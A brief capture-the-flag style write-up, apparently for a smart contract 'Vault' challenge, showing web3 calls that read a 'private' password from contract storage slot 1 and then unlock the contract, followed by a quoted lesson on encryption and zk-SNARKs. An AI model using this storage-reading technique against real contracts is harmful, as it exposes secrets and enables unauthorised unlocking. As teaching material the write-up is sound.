# How?

Private variables are not really private in smart contracts. 

I called `await web3.eth.getStorageAt('<contract address>', 1, (e,v) => console.log((v)));` to get hex value of the private variable
Then I just called `web3.utils.toAscii(<hex>);` to get the password

After this, we can unlock by `await contract.unlock(web3.utils.asciiToHex(<password in string format>));`

An excerpt from the website: 

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.